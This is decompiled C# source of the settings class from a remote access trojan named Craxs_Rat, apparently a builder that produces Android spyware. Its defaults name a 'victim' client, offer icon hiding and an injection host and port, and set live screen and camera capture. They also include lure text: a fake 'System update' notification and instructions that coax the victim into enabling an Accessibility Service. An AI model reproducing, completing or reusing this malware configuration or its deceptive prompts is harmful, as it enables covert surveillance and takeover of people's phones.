using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat.My
{
	// Token: 0x0200000A RID: 10
	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "16.0.0.0")]
	[CompilerGenerated]
	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal sealed partial class MySettings : ApplicationSettingsBase
	{
		// Token: 0x060000D3 RID: 211 RVA: 0x0000AB5C File Offset: 0x00008D5C
		[EditorBrowsable(EditorBrowsableState.Advanced)]
		private static void AutoSaveSettings(object sender, EventArgs e)
		{
			if (MyProject.Application.SaveMySettingsOnExit)
			{
				MySettingsProperty.Settings.Save();
			}
		}

		// Token: 0x1700007F RID: 127
		// (get) Token: 0x060000D4 RID: 212 RVA: 0x0000AB80 File Offset: 0x00008D80
		public static MySettings Default
		{
			get
			{
				if (!MySettings.addedHandler)
				{
					object obj = MySettings.addedHandlerLockObject;
					ObjectFlowControl.CheckForSyncLockOnValueType(obj);
					lock (obj)
					{
						if (!MySettings.addedHandler)
						{
							MyProject.Application.Shutdown += MySettings.AutoSaveSettings;
							MySettings.addedHandler = true;
						}
					}
				}
				return MySettings.defaultInstance;
			}
		}

		// Token: 0x17000080 RID: 128
		// (get) Token: 0x060000D5 RID: 213 RVA: 0x0000ABF8 File Offset: 0x00008DF8
		// (set) Token: 0x060000D6 RID: 214 RVA: 0x0000AC18 File Offset: 0x00008E18
		[DebuggerNonUserCode]
		[UserScopedSetting]
		[DefaultSettingValue("7771>7772")]
		public string ports
		{
			get
			{
				return Conversions.ToString(this["ports"]);
			}
			set
			{
				this["ports"] = value;
			}
		}

		// Token: 0x17000081 RID: 129
		// (get) Token: 0x060000D7 RID: 215 RVA: 0x0000AC34 File Offset: 0x00008E34
		// (set) Token: 0x060000D8 RID: 216 RVA: 0x0000AC54 File Offset: 0x00008E54
		[DebuggerNonUserCode]
		[UserScopedSetting]
		[DefaultSettingValue("Normal")]
		public string performance
		{
			get
			{
				return Conversions.ToString(this["performance"]);
			}
			set
			{
				this["performance"] = value;
			}
		}

		// Token: 0x17000082 RID: 130
		// (get) Token: 0x060000D9 RID: 217 RVA: 0x0000AC70 File Offset: 0x00008E70
		// (set) Token: 0x060000DA RID: 218 RVA: 0x0000AC90 File Offset: 0x00008E90
		[DefaultSettingValue("UTF8")]
		[UserScopedSetting]
		[DebuggerNonUserCode]
		public string encoding8
		{
			get
			{
				return Conversions.ToString(this["encoding8"]);
			}
			set
			{
				this["encoding8"] = value;
			}
		}

		// Token: 0x17000083 RID: 131
		// (get) Token: 0x060000DB RID: 219 RVA: 0x0000ACAC File Offset: 0x00008EAC
		// (set) Token: 0x060000DC RID: 220 RVA: 0x0000ACCC File Offset: 0x00008ECC
		[DefaultSettingValue("Yes")]
		[UserScopedSetting]
		[DebuggerNonUserCode]
		public string show_alert
		{
			get
			{
				return Conversions.ToString(this["show_alert"]);
			}
			set
			{
				this["show_alert"] = value;
			}
		}

		// Token: 0x17000084 RID: 132
		// (get) Token: 0x060000DD RID: 221 RVA: 0x0000ACE8 File Offset: 0x00008EE8
		// (set) Token: 0x060000DE RID: 222 RVA: 0x0000AD08 File Offset: 0x00008F08
		[DebuggerNonUserCode]
		[DefaultSettingValue("Right")]
		[UserScopedSetting]
		public string location
		{
			get
			{
				return Conversions.ToString(this["location"]);
			}
			set
			{
				this["location"] = value;
			}
		}

		// Token: 0x17000085 RID: 133
		// (get) Token: 0x060000DF RID: 223 RVA: 0x0000AD24 File Offset: 0x00008F24
		// (set) Token: 0x060000E0 RID: 224 RVA: 0x0000AD44 File Offset: 0x00008F44
		[DefaultSettingValue("Just tell me")]
		[UserScopedSetting]
		[DebuggerNonUserCode]
		public string disconnected
		{
			get
			{
				return Conversions.ToString(this["disconnected"]);
			}
			set
			{
				this["disconnected"] = value;
			}
		}

		// Token: 0x17000086 RID: 134
		// (get) Token: 0x060000E1 RID: 225 RVA: 0x0000AD60 File Offset: 0x00008F60
		// (set) Token: 0x060000E2 RID: 226 RVA: 0x0000AD80 File Offset: 0x00008F80
		[DefaultSettingValue("No")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public string Auto_focus
		{
			get
			{
				return Conversions.ToString(this["Auto_focus"]);
			}
			set
			{
				this["Auto_focus"] = value;
			}
		}

		// Token: 0x17000087 RID: 135
		// (get) Token: 0x060000E3 RID: 227 RVA: 0x0000AD9C File Offset: 0x00008F9C
		// (set) Token: 0x060000E4 RID: 228 RVA: 0x0000ADBC File Offset: 0x00008FBC
		[DebuggerNonUserCode]
		[DefaultSettingValue("Normal")]
		[UserScopedSetting]
		public string Effects_CAM
		{
			get
			{
				return Conversions.ToString(this["Effects_CAM"]);
			}
			set
			{
				this["Effects_CAM"] = value;
			}
		}

		// Token: 0x17000088 RID: 136
		// (get) Token: 0x060000E5 RID: 229 RVA: 0x0000ADD8 File Offset: 0x00008FD8
		// (set) Token: 0x060000E6 RID: 230 RVA: 0x0000ADF8 File Offset: 0x00008FF8
		[DefaultSettingValue("Streets")]
		[UserScopedSetting]
		[DebuggerNonUserCode]
		public string Style_Maps
		{
			get
			{
				return Conversions.ToString(this["Style_Maps"]);
			}
			set
			{
				this["Style_Maps"] = value;
			}
		}

		// Token: 0x17000089 RID: 137
		// (get) Token: 0x060000E7 RID: 231 RVA: 0x0000AE14 File Offset: 0x00009014
		// (set) Token: 0x060000E8 RID: 232 RVA: 0x0000AE34 File Offset: 0x00009034
		[DebuggerNonUserCode]
		[UserScopedSetting]
		[DefaultSettingValue("Yes")]
		public string Saving_data
		{
			get
			{
				return Conversions.ToString(this["Saving_data"]);
			}
			set
			{
				this["Saving_data"] = value;
			}
		}

		// Token: 0x1700008A RID: 138
		// (get) Token: 0x060000E9 RID: 233 RVA: 0x0000AE50 File Offset: 0x00009050
		// (set) Token: 0x060000EA RID: 234 RVA: 0x0000AE70 File Offset: 0x00009070
		[DebuggerNonUserCode]
		[UserScopedSetting]
		[DefaultSettingValue("Auto")]
		public string CAMQuality
		{
			get
			{
				return Conversions.ToString(this["CAMQuality"]);
			}
			set
			{
				this["CAMQuality"] = value;
			}
		}

		// Token: 0x1700008B RID: 139
		// (get) Token: 0x060000EB RID: 235 RVA: 0x0000AE8C File Offset: 0x0000908C
		// (set) Token: 0x060000EC RID: 236 RVA: 0x0000AEAC File Offset: 0x000090AC
		[DefaultSettingValue("Client")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public string build_text_name_victim
		{
			get
			{
				return Conversions.ToString(this["build_text_name_victim"]);
			}
			set
			{
				this["build_text_name_victim"] = value;
			}
		}

		// Token: 0x1700008C RID: 140
		// (get) Token: 0x060000ED RID: 237 RVA: 0x0000AEC8 File Offset: 0x000090C8
		// (set) Token: 0x060000EE RID: 238 RVA: 0x0000AEE8 File Offset: 0x000090E8
		[DefaultSettingValue("CraxsApp")]
		[UserScopedSetting]
		[DebuggerNonUserCode]
		public string build_text_name_patch
		{
			get
			{
				return Conversions.ToString(this["build_text_name_patch"]);
			}
			set
			{
				this["build_text_name_patch"] = value;
			}
		}

		// Token: 0x1700008D RID: 141
		// (get) Token: 0x060000EF RID: 239 RVA: 0x0000AF04 File Offset: 0x00009104
		// (set) Token: 0x060000F0 RID: 240 RVA: 0x0000AF24 File Offset: 0x00009124
		[DefaultSettingValue("1.0.0.0")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public string build_text_version
		{
			get
			{
				return Conversions.ToString(this["build_text_version"]);
			}
			set
			{
				this["build_text_version"] = value;
			}
		}

		// Token: 0x1700008E RID: 142
		// (get) Token: 0x060000F1 RID: 241 RVA: 0x0000AF40 File Offset: 0x00009140
		// (set) Token: 0x060000F2 RID: 242 RVA: 0x0000AF60 File Offset: 0x00009160
		[DebuggerNonUserCode]
		[UserScopedSetting]
		[DefaultSettingValue("0")]
		public int build_text_sleep
		{
			get
			{
				return Conversions.ToInteger(this["build_text_sleep"]);
			}
			set
			{
				this["build_text_sleep"] = value;
			}
		}

		// Token: 0x1700008F RID: 143
		// (get) Token: 0x060000F3 RID: 243 RVA: 0x0000AF80 File Offset: 0x00009180
		// (set) Token: 0x060000F4 RID: 244 RVA: 0x0000AFA0 File Offset: 0x000091A0
		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("7771")]
		public int build_text_port
		{
			get
			{
				return Conversions.ToInteger(this["build_text_port"]);
			}
			set
			{
				this["build_text_port"] = value;
			}
		}

		// Token: 0x17000090 RID: 144
		// (get) Token: 0x060000F5 RID: 245 RVA: 0x0000230E File Offset: 0x0000050E
		// (set) Token: 0x060000F6 RID: 246 RVA: 0x0000AFC0 File Offset: 0x000091C0
		[DefaultSettingValue("False")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public bool build_Checked_hide
		{
			get
			{
				return Conversions.ToBoolean(this["build_Checked_hide"]);
			}
			set
			{
				this["build_Checked_hide"] = value;
			}
		}

		// Token: 0x17000091 RID: 145
		// (get) Token: 0x060000F7 RID: 247 RVA: 0x00002320 File Offset: 0x00000520
		// (set) Token: 0x060000F8 RID: 248 RVA: 0x0000AFE0 File Offset: 0x000091E0
		[DebuggerNonUserCode]
		[UserScopedSetting]
		[DefaultSettingValue("False")]
		public bool build_Checked_icon
		{
			get
			{
				return Conversions.ToBoolean(this["build_Checked_icon"]);
			}
			set
			{
				this["build_Checked_icon"] = value;
			}
		}

		// Token: 0x17000092 RID: 146
		// (get) Token: 0x060000F9 RID: 249 RVA: 0x00002332 File Offset: 0x00000532
		// (set) Token: 0x060000FA RID: 250 RVA: 0x0000B000 File Offset: 0x00009200
		[DefaultSettingValue("True")]
		[UserScopedSetting]
		[DebuggerNonUserCode]
		public bool build_Checked_doze
		{
			get
			{
				return Conversions.ToBoolean(this["build_Checked_doze"]);
			}
			set
			{
				this["build_Checked_doze"] = value;
			}
		}

		// Token: 0x17000093 RID: 147
		// (get) Token: 0x060000FB RID: 251 RVA: 0x0000B020 File Offset: 0x00009220
		// (set) Token: 0x060000FC RID: 252 RVA: 0x0000B040 File Offset: 0x00009240
		[DefaultSettingValue("null")]
		[UserScopedSetting]
		[DebuggerNonUserCode]
		public string build_path_icon
		{
			get
			{
				return Conversions.ToString(this["build_path_icon"]);
			}
			set
			{
				this["build_path_icon"] = value;
			}
		}

		// Token: 0x17000094 RID: 148
		// (get) Token: 0x060000FD RID: 253 RVA: 0x0000B05C File Offset: 0x0000925C
		// (set) Token: 0x060000FE RID: 254 RVA: 0x0000B07C File Offset: 0x0000927C
		[DebuggerNonUserCode]
		[UserScopedSetting]
		[DefaultSettingValue("null")]
		public string build_DGV_list
		{
			get
			{
				return Conversions.ToString(this["build_DGV_list"]);
			}
			set
			{
				this["build_DGV_list"] = value;
			}
		}

		// Token: 0x17000095 RID: 149
		// (get) Token: 0x060000FF RID: 255 RVA: 0x0000B098 File Offset: 0x00009298
		// (set) Token: 0x06000100 RID: 256 RVA: 0x0000B0C8 File Offset: 0x000092C8
		[DebuggerNonUserCode]
		[DefaultSettingValue("95, 95, 250")]
		[UserScopedSetting]
		public Color DefaultColorForeground
		{
			get
			{
				object obj = this["DefaultColorForeground"];
				return (obj == null) ? default(Color) : ((Color)obj);
			}
			set
			{
				this["DefaultColorForeground"] = value;
			}
		}

		// Token: 0x17000096 RID: 150
		// (get) Token: 0x06000101 RID: 257 RVA: 0x0000B0E8 File Offset: 0x000092E8
		// (set) Token: 0x06000102 RID: 258 RVA: 0x0000B118 File Offset: 0x00009318
		[DebuggerNonUserCode]
		[DefaultSettingValue("50, 50, 50")]
		[UserScopedSetting]
		public Color DefaultColorBackground
		{
			get
			{
				object obj = this["DefaultColorBackground"];
				return (obj != null) ? ((Color)obj) : default(Color);
			}
			set
			{
				this["DefaultColorBackground"] = value;
			}
		}

		// Token: 0x17000097 RID: 151
		// (get) Token: 0x06000103 RID: 259 RVA: 0x0000B138 File Offset: 0x00009338
		// (set) Token: 0x06000104 RID: 260 RVA: 0x0000B158 File Offset: 0x00009358
		[UserScopedSetting]
		[DefaultSettingValue("9")]
		[DebuggerNonUserCode]
		public int FontSize
		{
			get
			{
				return Conversions.ToInteger(this["FontSize"]);
			}
			set
			{
				this["FontSize"] = value;
			}
		}

		// Token: 0x17000098 RID: 152
		// (get) Token: 0x06000105 RID: 261 RVA: 0x0000B178 File Offset: 0x00009378
		// (set) Token: 0x06000106 RID: 262 RVA: 0x0000B198 File Offset: 0x00009398
		[DebuggerNonUserCode]
		[DefaultSettingValue("Regular")]
		[UserScopedSetting]
		public string FontStyle
		{
			get
			{
				return Conversions.ToString(this["FontStyle"]);
			}
			set
			{
				this["FontStyle"] = value;
			}
		}

		// Token: 0x17000099 RID: 153
		// (get) Token: 0x06000107 RID: 263 RVA: 0x0000B1B4 File Offset: 0x000093B4
		// (set) Token: 0x06000108 RID: 264 RVA: 0x0000B1D4 File Offset: 0x000093D4
		[DebuggerNonUserCode]
		[DefaultSettingValue("00110000")]
		[UserScopedSetting]
		public string EncryptionKey
		{
			get
			{
				return Conversions.ToString(this["EncryptionKey"]);
			}
			set
			{
				this["EncryptionKey"] = value;
			}
		}

		// Token: 0x1700009A RID: 154
		// (get) Token: 0x06000109 RID: 265 RVA: 0x0000B1F0 File Offset: 0x000093F0
		// (set) Token: 0x0600010A RID: 266 RVA: 0x0000B220 File Offset: 0x00009420
		[DefaultSettingValue("Red")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public Color DefaultColor_NewColorFiles
		{
			get
			{
				object obj = this["DefaultColor_NewColorFiles"];
				return (obj != null) ? ((Color)obj) : default(Color);
			}
			set
			{
				this["DefaultColor_NewColorFiles"] = value;
			}
		}

		// Token: 0x1700009B RID: 155
		// (get) Token: 0x0600010B RID: 267 RVA: 0x0000B240 File Offset: 0x00009440
		// (set) Token: 0x0600010C RID: 268 RVA: 0x0000B270 File Offset: 0x00009470
		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("Blue")]
		public Color DefaultColor_ColorTitles
		{
			get
			{
				object obj = this["DefaultColor_ColorTitles"];
				return (obj == null) ? default(Color) : ((Color)obj);
			}
			set
			{
				this["DefaultColor_ColorTitles"] = value;
			}
		}

		// Token: 0x1700009C RID: 156
		// (get) Token: 0x0600010D RID: 269 RVA: 0x0000B290 File Offset: 0x00009490
		// (set) Token: 0x0600010E RID: 270 RVA: 0x0000B2B0 File Offset: 0x000094B0
		[UserScopedSetting]
		[DefaultSettingValue("null")]
		[DebuggerNonUserCode]
		public string BIND_Path
		{
			get
			{
				return Conversions.ToString(this["BIND_Path"]);
			}
			set
			{
				this["BIND_Path"] = value;
			}
		}

		// Token: 0x1700009D RID: 157
		// (get) Token: 0x0600010F RID: 271 RVA: 0x0000B2CC File Offset: 0x000094CC
		// (set) Token: 0x06000110 RID: 272 RVA: 0x0000B2EC File Offset: 0x000094EC
		[DebuggerNonUserCode]
		[UserScopedSetting]
		[DefaultSettingValue("null")]
		public string BIND_EX
		{
			get
			{
				return Conversions.ToString(this["BIND_EX"]);
			}
			set
			{
				this["BIND_EX"] = value;
			}
		}

		// Token: 0x1700009E RID: 158
		// (get) Token: 0x06000111 RID: 273 RVA: 0x0000B308 File Offset: 0x00009508
		// (set) Token: 0x06000112 RID: 274 RVA: 0x0000B328 File Offset: 0x00009528
		[DebuggerNonUserCode]
		[DefaultSettingValue("null")]
		[UserScopedSetting]
		public string intent
		{
			get
			{
				return Conversions.ToString(this["intent"]);
			}
			set
			{
				this["intent"] = value;
			}
		}

		// Token: 0x1700009F RID: 159
		// (get) Token: 0x06000113 RID: 275 RVA: 0x00002344 File Offset: 0x00000544
		// (set) Token: 0x06000114 RID: 276 RVA: 0x0000B344 File Offset: 0x00009544
		[DefaultSettingValue("True")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public bool NOTI_SOUND
		{
			get
			{
				return Conversions.ToBoolean(this["NOTI_SOUND"]);
			}
			set
			{
				this["NOTI_SOUND"] = value;
			}
		}

		// Token: 0x170000A0 RID: 160
		// (get) Token: 0x06000115 RID: 277 RVA: 0x0000B364 File Offset: 0x00009564
		// (set) Token: 0x06000116 RID: 278 RVA: 0x0000B384 File Offset: 0x00009584
		[DebuggerNonUserCode]
		[DefaultSettingValue("Yes")]
		[UserScopedSetting]
		public string Flags_Visible
		{
			get
			{
				return Conversions.ToString(this["Flags_Visible"]);
			}
			set
			{
				this["Flags_Visible"] = value;
			}
		}

		// Token: 0x170000A1 RID: 161
		// (get) Token: 0x06000117 RID: 279 RVA: 0x0000B3A0 File Offset: 0x000095A0
		// (set) Token: 0x06000118 RID: 280 RVA: 0x0000B3C0 File Offset: 0x000095C0
		[DebuggerNonUserCode]
		[UserScopedSetting]
		[DefaultSettingValue("32px")]
		public string Flags_Size
		{
			get
			{
				return Conversions.ToString(this["Flags_Size"]);
			}
			set
			{
				this["Flags_Size"] = value;
			}
		}

		// Token: 0x170000A2 RID: 162
		// (get) Token: 0x06000119 RID: 281 RVA: 0x0000B3DC File Offset: 0x000095DC
		// (set) Token: 0x0600011A RID: 282 RVA: 0x0000B3FC File Offset: 0x000095FC
		[DebuggerNonUserCode]
		[DefaultSettingValue("Yes")]
		[UserScopedSetting]
		public string Round
		{
			get
			{
				return Conversions.ToString(this["Round"]);
			}
			set
			{
				this["Round"] = value;
			}
		}

		// Token: 0x170000A3 RID: 163
		// (get) Token: 0x0600011B RID: 283 RVA: 0x0000B418 File Offset: 0x00009618
		// (set) Token: 0x0600011C RID: 284 RVA: 0x0000B438 File Offset: 0x00009638
		[DebuggerNonUserCode]
		[UserScopedSetting]
		[DefaultSettingValue("Yes")]
		public string SStatus_Visible
		{
			get
			{
				return Conversions.ToString(this["SStatus_Visible"]);
			}
			set
			{
				this["SStatus_Visible"] = value;
			}
		}

		// Token: 0x170000A4 RID: 164
		// (get) Token: 0x0600011D RID: 285 RVA: 0x0000B454 File Offset: 0x00009654
		// (set) Token: 0x0600011E RID: 286 RVA: 0x0000B474 File Offset: 0x00009674
		[UserScopedSetting]
		[DefaultSettingValue("0123456789")]
		[DebuggerNonUserCode]
		public string _Columns
		{
			get
			{
				return Conversions.ToString(this["_Columns"]);
			}
			set
			{
				this["_Columns"] = value;
			}
		}

		// Token: 0x170000A5 RID: 165
		// (get) Token: 0x0600011F RID: 287 RVA: 0x0000B490 File Offset: 0x00009690
		// (set) Token: 0x06000120 RID: 288 RVA: 0x0000B4B0 File Offset: 0x000096B0
		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("Small")]
		public string FM_IC_Size
		{
			get
			{
				return Conversions.ToString(this["FM_IC_Size"]);
			}
			set
			{
				this["FM_IC_Size"] = value;
			}
		}

		// Token: 0x170000A6 RID: 166
		// (get) Token: 0x06000121 RID: 289 RVA: 0x0000B4CC File Offset: 0x000096CC
		// (set) Token: 0x06000122 RID: 290 RVA: 0x0000B4EC File Offset: 0x000096EC
		[DefaultSettingValue("Yes")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public string Removing_Duplicates
		{
			get
			{
				return Conversions.ToString(this["Removing_Duplicates"]);
			}
			set
			{
				this["Removing_Duplicates"] = value;
			}
		}

		// Token: 0x170000A7 RID: 167
		// (get) Token: 0x06000123 RID: 291 RVA: 0x0000B508 File Offset: 0x00009708
		// (set) Token: 0x06000124 RID: 292 RVA: 0x0000B528 File Offset: 0x00009728
		[DebuggerNonUserCode]
		[DefaultSettingValue("No")]
		[UserScopedSetting]
		public string _multi_sounds
		{
			get
			{
				return Conversions.ToString(this["_multi_sounds"]);
			}
			set
			{
				this["_multi_sounds"] = value;
			}
		}

		// Token: 0x170000A8 RID: 168
		// (get) Token: 0x06000125 RID: 293 RVA: 0x0000B544 File Offset: 0x00009744
		// (set) Token: 0x06000126 RID: 294 RVA: 0x0000B564 File Offset: 0x00009764
		[DefaultSettingValue("20")]
		[UserScopedSetting]
		[DebuggerNonUserCode]
		public int ImageQualty
		{
			get
			{
				return Conversions.ToInteger(this["ImageQualty"]);
			}
			set
			{
				this["ImageQualty"] = value;
			}
		}

		// Token: 0x170000A9 RID: 169
		// (get) Token: 0x06000127 RID: 295 RVA: 0x0000B584 File Offset: 0x00009784
		// (set) Token: 0x06000128 RID: 296 RVA: 0x0000B5A4 File Offset: 0x000097A4
		[DefaultSettingValue("Yes")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public string Cashpic
		{
			get
			{
				return Conversions.ToString(this["Cashpic"]);
			}
			set
			{
				this["Cashpic"] = value;
			}
		}

		// Token: 0x170000AA RID: 170
		// (get) Token: 0x06000129 RID: 297 RVA: 0x0000B5C0 File Offset: 0x000097C0
		// (set) Token: 0x0600012A RID: 298 RVA: 0x0000B5E0 File Offset: 0x000097E0
		[DebuggerNonUserCode]
		[DefaultSettingValue("Yes")]
		[UserScopedSetting]
		public string LOG
		{
			get
			{
				return Conversions.ToString(this["LOG"]);
			}
			set
			{
				this["LOG"] = value;
			}
		}

		// Token: 0x170000AB RID: 171
		// (get) Token: 0x0600012B RID: 299 RVA: 0x0000B5FC File Offset: 0x000097FC
		// (set) Token: 0x0600012C RID: 300 RVA: 0x0000B61C File Offset: 0x0000981C
		[UserScopedSetting]
		[DefaultSettingValue("PT1BQUFic2RGQURhY0FTQ1ZERVNEVnNkU0RSVlNEVkFFR1NTRkJSRUE=")]
		[DebuggerNonUserCode]
		public string DKEY
		{
			get
			{
				return Conversions.ToString(this["DKEY"]);
			}
			set
			{
				this["DKEY"] = value;
			}
		}

		// Token: 0x170000AC RID: 172
		// (get) Token: 0x0600012D RID: 301 RVA: 0x0000B638 File Offset: 0x00009838
		// (set) Token: 0x0600012E RID: 302 RVA: 0x0000B658 File Offset: 0x00009858
		[DefaultSettingValue("Yes")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public string ShowAlertDis
		{
			get
			{
				return Conversions.ToString(this["ShowAlertDis"]);
			}
			set
			{
				this["ShowAlertDis"] = value;
			}
		}

		// Token: 0x170000AD RID: 173
		// (get) Token: 0x0600012F RID: 303 RVA: 0x0000B674 File Offset: 0x00009874
		// (set) Token: 0x06000130 RID: 304 RVA: 0x0000B694 File Offset: 0x00009894
		[DebuggerNonUserCode]
		[DefaultSettingValue("Yes")]
		[UserScopedSetting]
		public string hidecoonstart
		{
			get
			{
				return Conversions.ToString(this["hidecoonstart"]);
			}
			set
			{
				this["hidecoonstart"] = value;
			}
		}

		// Token: 0x170000AE RID: 174
		// (get) Token: 0x06000131 RID: 305 RVA: 0x0000B6B0 File Offset: 0x000098B0
		// (set) Token: 0x06000132 RID: 306 RVA: 0x0000B6D0 File Offset: 0x000098D0
		[DebuggerNonUserCode]
		[DefaultSettingValue("...")]
		[UserScopedSetting]
		public string inj_thost
		{
			get
			{
				return Conversions.ToString(this["inj_thost"]);
			}
			set
			{
				this["inj_thost"] = value;
			}
		}

		// Token: 0x170000AF RID: 175
		// (get) Token: 0x06000133 RID: 307 RVA: 0x0000B6EC File Offset: 0x000098EC
		// (set) Token: 0x06000134 RID: 308 RVA: 0x0000B70C File Offset: 0x0000990C
		[DefaultSettingValue("4444")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public string inj_tport
		{
			get
			{
				return Conversions.ToString(this["inj_tport"]);
			}
			set
			{
				this["inj_tport"] = value;
			}
		}

		// Token: 0x170000B0 RID: 176
		// (get) Token: 0x06000135 RID: 309 RVA: 0x0000B728 File Offset: 0x00009928
		// (set) Token: 0x06000136 RID: 310 RVA: 0x0000B748 File Offset: 0x00009948
		[UserScopedSetting]
		[DebuggerNonUserCode]
		[DefaultSettingValue("1234")]
		public string inj_tkey
		{
			get
			{
				return Conversions.ToString(this["inj_tkey"]);
			}
			set
			{
				this["inj_tkey"] = value;
			}
		}

		// Token: 0x170000B1 RID: 177
		// (get) Token: 0x06000137 RID: 311 RVA: 0x0000B764 File Offset: 0x00009964
		// (set) Token: 0x06000138 RID: 312 RVA: 0x0000B784 File Offset: 0x00009984
		[UserScopedSetting]
		[DefaultSettingValue("Client")]
		[DebuggerNonUserCode]
		public string inj_tnam
		{
			get
			{
				return Conversions.ToString(this["inj_tnam"]);
			}
			set
			{
				this["inj_tnam"] = value;
			}
		}

		// Token: 0x170000B2 RID: 178
		// (get) Token: 0x06000139 RID: 313 RVA: 0x00002356 File Offset: 0x00000556
		// (set) Token: 0x0600013A RID: 314 RVA: 0x0000B7A0 File Offset: 0x000099A0
		[DefaultSettingValue("False")]
		[UserScopedSetting]
		[DebuggerNonUserCode]
		public bool requestmade
		{
			get
			{
				return Conversions.ToBoolean(this["requestmade"]);
			}
			set
			{
				this["requestmade"] = value;
			}
		}

		// Token: 0x170000B3 RID: 179
		// (get) Token: 0x0600013B RID: 315 RVA: 0x00002368 File Offset: 0x00000568
		// (set) Token: 0x0600013C RID: 316 RVA: 0x0000B7C0 File Offset: 0x000099C0
		[UserScopedSetting]
		[DefaultSettingValue("False")]
		[DebuggerNonUserCode]
		public bool reportmade
		{
			get
			{
				return Conversions.ToBoolean(this["reportmade"]);
			}
			set
			{
				this["reportmade"] = value;
			}
		}

		// Token: 0x170000B4 RID: 180
		// (get) Token: 0x0600013D RID: 317 RVA: 0x0000B7E0 File Offset: 0x000099E0
		// (set) Token: 0x0600013E RID: 318 RVA: 0x0000B800 File Offset: 0x00009A00
		[UserScopedSetting]
		[DefaultSettingValue("System update")]
		[DebuggerNonUserCode]
		public string NotifiTitle
		{
			get
			{
				return Conversions.ToString(this["NotifiTitle"]);
			}
			set
			{
				this["NotifiTitle"] = value;
			}
		}

		// Token: 0x170000B5 RID: 181
		// (get) Token: 0x0600013F RID: 319 RVA: 0x0000B81C File Offset: 0x00009A1C
		// (set) Token: 0x06000140 RID: 320 RVA: 0x0000B83C File Offset: 0x00009A3C
		[DebuggerNonUserCode]
		[UserScopedSetting]
		[DefaultSettingValue("New system software is available, Tap to learn more.")]
		public string NotifiText
		{
			get
			{
				return Conversions.ToString(this["NotifiText"]);
			}
			set
			{
				this["NotifiText"] = value;
			}
		}

		// Token: 0x170000B6 RID: 182
		// (get) Token: 0x06000141 RID: 321 RVA: 0x0000B858 File Offset: 0x00009A58
		// (set) Token: 0x06000142 RID: 322 RVA: 0x0000B878 File Offset: 0x00009A78
		[DefaultSettingValue("This App Request Accessibility Service:\r\n• Click on Enable\r\n• Go to Downloaded Service\r\n• Enable [MY-NAME]")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public string bodytext
		{
			get
			{
				return Conversions.ToString(this["bodytext"]);
			}
			set
			{
				this["bodytext"] = value;
			}
		}

		// Token: 0x170000B7 RID: 183
		// (get) Token: 0x06000143 RID: 323 RVA: 0x0000B894 File Offset: 0x00009A94
		// (set) Token: 0x06000144 RID: 324 RVA: 0x0000B8B4 File Offset: 0x00009AB4
		[DefaultSettingValue("...")]
		[DebuggerNonUserCode]
		[UserScopedSetting]
		public string accessdiscribe
		{
			get
			{
				return Conversions.ToString(this["accessdiscribe"]);
			}
			set
			{
				this["accessdiscribe"] = value;
			}
		}

		// Token: 0x170000B8 RID: 184
		// (get) Token: 0x06000145 RID: 325 RVA: 0x0000B8D0 File Offset: 0x00009AD0
		// (set) Token: 0x06000146 RID: 326 RVA: 0x0000B8F0 File Offset: 0x00009AF0
		[DefaultSettingValue("100")]
		[UserScopedSetting]
		[DebuggerNonUserCode]
		public string live_sc_qulty
		{
			get
			{
				return Conversions.ToString(this["live_sc_qulty"]);
			}
			set
			{
				this["live_sc_qulty"] = value;
			}
		}

		// Token: 0x170000B9 RID: 185
		// (get) Token: 0x06000147 RID: 327 RVA: 0x0000B90C File Offset: 0x00009B0C
		// (set) Token: 0x06000148 RID: 328 RVA: 0x0000B92C File Offset: 0x00009B2C
		[DebuggerNonUserCode]
		[DefaultSettingValue("10")]
		[UserScopedSetting]
		public string live_fps_rec
		{
			get
			{
				return Conversions.ToString(this["live_fps_rec"]);
			}
			set
			{
				this["live_fps_rec"] = value;
			}
		}

		// Token: 0x04000043 RID: 67
		private static MySettings defaultInstance = (MySettings)SettingsBase.Synchronized(new MySettings());

		// Token: 0x04000044 RID: 68
		private static bool addedHandler;

		// Token: 0x04000045 RID: 69
		private static object addedHandlerLockObject = RuntimeHelpers.GetObjectValue(new object());
	}
}
